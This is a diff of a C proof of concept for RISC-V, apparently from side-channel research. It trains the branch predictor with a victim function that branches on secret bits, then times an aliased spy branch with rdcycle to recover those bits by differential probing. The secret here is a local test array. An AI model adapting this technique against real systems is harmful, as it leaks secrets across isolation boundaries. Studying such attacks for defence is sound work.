@@ -1,48 +1,43 @@
-// brad_v1_rdcycle_diffprobe.c
-// BRAD-v1 minimal modified to use rdcycle for timing (cycle counts)
-// with differential probing: measure spy(1) and spy(0) and pick faster.
-//
-// Compile for RISC-V target (Linux):
-//   riscv64-linux-gnu-gcc -O2 -static -o brad_v1_rdcycle_diffprobe brad_v1_rdcycle_diffprobe.c
-// Run pinned: taskset -c 0 ./brad_v1_rdcycle_diffprobe
+// brad_v1_sweep.c
+// BRAD-v1 sweepable probe. victim_f in .text.victim, spy_f in .text.spy
+// Differential probe (measure spy(1) and spy(0) and pick faster).
+// Compile and link with a custom linker script to set alignment of sections.
 
 #include <stdio.h>
 #include <stdint.h>
-#include <stdlib.h>
 
 #define SECRET_LEN 5
-#define ATTACK_ROUNDS 50      
-#define TRAINING_REPS 2       
-#define CAL_SAMPLES 200
-#define PROBE_SAMPLES 200
+#define ATTACK_ROUNDS 40      // how many attack rounds to average per index
+#define TRAINING_REPS 16      // training strength
+#define PROBE_SAMPLES 400     // samples per probe value (1 & 0)
 
-// Victim secret 
 volatile uint8_t sec[SECRET_LEN] = {1,0,0,1,0};
-
-// Spy data 
 volatile uint8_t array1[1] = {1};
 
-// condBranch: check byte at addr
+/* Slight asymmetry in branch bodies to produce a measurable delta */
+__attribute__((noinline, aligned(64)))
 void condBranch(uint8_t *addr) {
     if (*addr) {
-        asm("nop ; nop\n");
+        asm volatile("nop; nop; nop; nop");
     } else {
-        asm(" addi t1 , zero , 2\n");
+        asm volatile("addi t1, zero, 2; nop");
     }
 }
 
-// victim and spy wrappers
+/* Place victim and spy into named text sections so the linker script can position them */
+__attribute__((noinline, aligned(64), section(".text.victim")))
 void victim_f(unsigned idx) {
     condBranch((uint8_t*)&sec[idx]);
 }
 
+__attribute__((noinline, aligned(64), section(".text.spy")))
 void spy_f(unsigned idx) {
     (void)idx;
     condBranch((uint8_t*)&array1[0]);
 }
 
-// rdcycle-based timestamp (serialized)
-static inline uint64_t time(void) {
+/* rdcycle read with fences for serialization */
+static inline uint64_t rdcycle_serialized(void) {
     uint64_t v;
     asm volatile("fence iorw, iorw" ::: "memory");
     asm volatile("rdcycle %0" : "=r"(v));
@@ -50,120 +45,53 @@ static inline uint64_t time(void) {
     return v;
 }
 
-/* Differential probe: measure spy for value 1 and value 0 (each PROBE_SAMPLES times)
-   Return 1 if spy(1) is faster, else 0.
-*/
-static int measure_and_choose(unsigned probe_samples) {
-    uint64_t sum1 = 0;
-    uint64_t sum0 = 0;
-    uint64_t t0, t1;
-
-    // measure spy when array1[0] = 1
-    array1[0] = 1;
+/* measure spy for value v, probe_samples times, return total cycles */
+static uint64_t measure_spy_total(uint8_t v, unsigned probe_samples) {
+    uint64_t sum = 0;
+    array1[0] = v;
     for (unsigned i = 0; i < probe_samples; ++i) {
-        t0 = time();
+        uint64_t t0 = rdcycle_serialized();
         spy_f(0);
-        t1 = time();
-        sum1 += (t1 - t0);
+        uint64_t t1 = rdcycle_serialized();
+        sum += (t1 - t0);
     }
-
-    // measure spy when array1[0] = 0
-    array1[0] = 0;
-    for (unsigned i = 0; i < probe_samples; ++i) {
-        t0 = time();
-        spy_f(0);
-        t1 = time();
-        sum0 += (t1 - t0);
-    }
-
-    // lower average -> faster -> indicates predictor favored that outcome
-    // If tie, return 0 arbitrarily.
-    return (sum1 < sum0) ? 1 : 0;
+    return sum;
 }
 
 int main(void) {
-    printf("BRAD-v1 minimal using rdcycle (cycles) with differential probing\n");
-    printf("Secret (ground truth): ");
-    for (unsigned i = 0; i < SECRET_LEN; ++i) printf("%u ", sec[i]);
+    printf("BRAD-v1 sweep probe (ATTACK_ROUNDS=%d TRAINING_REPS=%d PROBE_SAMPLES=%d)\n",
+           ATTACK_ROUNDS, TRAINING_REPS, PROBE_SAMPLES);
+    printf("Secret: ");
+    for (unsigned i=0;i<SECRET_LEN;i++) printf("%u ", sec[i]);
     printf("\n\n");
 
-    double calib_mean_taken[SECRET_LEN];
-    double calib_mean_not[SECRET_LEN];
-
     for (unsigned idx = 0; idx < SECRET_LEN; ++idx) {
-
-        // -------------------------
-        //  Calibration (unchanged)
-        // -------------------------
-        // Force taken
-        {
-            uint8_t saved = sec[idx];
-            sec[idx] = 1;
-
-            for (unsigned t = 0; t < 100; ++t) {
-                for (unsigned r = 0; r < TRAINING_REPS; ++r) {
-                    victim_f(idx);
-                }
-            }
-
-            uint64_t sum_cycles = 0;
-            for (unsigned s = 0; s < CAL_SAMPLES; ++s) {
-                uint64_t t0 = time();
-                spy_f(0);
-                uint64_t t1 = time();
-                sum_cycles += (t1 - t0);
-            }
-            calib_mean_taken[idx] = (double)sum_cycles / (double)CAL_SAMPLES;
-
-            sec[idx] = saved; 
-        }
-
-        // Force not-taken
-        {
-            uint8_t saved = sec[idx];
-            sec[idx] = 0;
-
-            for (unsigned t = 0; t < 100; ++t) {
-                for (unsigned r = 0; r < TRAINING_REPS; ++r) {
-                    victim_f(idx);
-                }
-            }
-
-            uint64_t sum_cycles = 0;
-            for (unsigned s = 0; s < CAL_SAMPLES; ++s) {
-                uint64_t t0 = time();
-                spy_f(0);
-                uint64_t t1 = time();
-                sum_cycles += (t1 - t0);
-            }
-            calib_mean_not[idx] = (double)sum_cycles / (double)CAL_SAMPLES;
-
-            sec[idx] = saved;
-        }
-
-        double threshold = (calib_mean_taken[idx] + calib_mean_not[idx]) / 2.0;
-        printf("Index %u calibration: mean_taken=%.2f cycles, mean_not=%.2f cycles, threshold=%.2f cycles\n",
-               idx, calib_mean_taken[idx], calib_mean_not[idx], threshold);
-
-        // -------------------------
-        // Attack: train with real secret and probe; repeat ATTACK_ROUNDS times and decide by majority
-        // (uses differential probing per round)
-        // -------------------------
         unsigned recovered_count1 = 0;
-        for (unsigned k = 0; k < ATTACK_ROUNDS; ++k) {
+        uint64_t accum_sum1 = 0;
+        uint64_t accum_sum0 = 0;
 
-            for (unsigned j = 0; j < TRAINING_REPS; ++j) {
+        for (unsigned r = 0; r < ATTACK_ROUNDS; ++r) {
+            /* Train predictor by calling victim_f TRAINING_REPS times (real secret) */
+            for (unsigned t = 0; t < TRAINING_REPS; ++t) {
                 victim_f(idx);
             }
 
-            // Differential probing: measure spy(1) and spy(0) and choose faster
-            int rec = measure_and_choose(PROBE_SAMPLES);
+            /* Differential probe: measure spy(1) then spy(0) */
+            uint64_t sum1 = measure_spy_total(1, PROBE_SAMPLES);
+            uint64_t sum0 = measure_spy_total(0, PROBE_SAMPLES);
+
+            accum_sum1 += sum1;
+            accum_sum0 += sum0;
+
+            int rec = (sum1 < sum0) ? 1 : 0; // faster wins
             if (rec) recovered_count1++;
         }
 
-        int recovered_bit = (recovered_count1 > (ATTACK_ROUNDS / 2)) ? 1 : 0;
-        printf("Index %u: mean_taken=%.2f mean_not=%.2f threshold=%.2f -> recovered_count1=%u/%u => recovered=%d (actual=%u)\n\n",
-               idx, calib_mean_taken[idx], calib_mean_not[idx], threshold, recovered_count1, ATTACK_ROUNDS, recovered_bit, sec[idx]);
+        double mean1 = (double)accum_sum1 / (double)(ATTACK_ROUNDS * PROBE_SAMPLES);
+        double mean0 = (double)accum_sum0 / (double)(ATTACK_ROUNDS * PROBE_SAMPLES);
+
+        printf("Index %u: mean_probe(1)=%.3f cycles mean_probe(0)=%.3f cycles recovered_count1=%u/%u => recovered=%d (actual=%u)\n",
+               idx, mean1, mean0, recovered_count1, ATTACK_ROUNDS, (recovered_count1 > (ATTACK_ROUNDS/2))?1:0, sec[idx]);
     }
 
     return 0;
